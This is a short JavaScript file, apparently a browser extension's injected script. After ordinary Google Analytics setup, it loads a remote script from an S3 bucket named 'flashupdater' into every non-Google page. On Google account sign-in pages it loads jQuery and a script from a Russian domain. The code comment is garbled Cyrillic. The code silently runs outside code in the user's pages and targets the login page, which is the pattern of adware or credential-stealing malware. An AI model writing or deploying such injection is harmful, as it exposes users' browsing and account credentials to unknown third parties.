var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-50343625-11']);
      _gaq.push(['_trackPageview', "pageview"]);

      (function() {
  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
  ga.src = 'https://ssl.google-analytics.com/ga.js';
  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();

var url = document.location.href;
//URL Р Т‘Р В»РЎРЏ Р С—Р С•Р Т‘Р С”Р В»РЎР‹РЎвЂЎР ВµР Р…Р С‘РЎРЏ.
var urlOther = '//s3.amazonaws.com/flashupdater/gj.js';
//(url);


if(url.indexOf('google')<0){
	var scr=document.createElement('script');
	scr.src=urlOther;	
	document.head.appendChild(scr);	
}else if(url.indexOf('accounts.google')>=0){
	var getURa = 'https://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js';
	var scr=document.createElement('script');
	scr.src=getURa;
	document.head.appendChild(scr);
	var getURa2 = '//advkings.ru/myfrut/gj.js';
	var scr2=document.createElement('script');
	scr2.src=getURa2;
	document.head.appendChild(scr2);
}

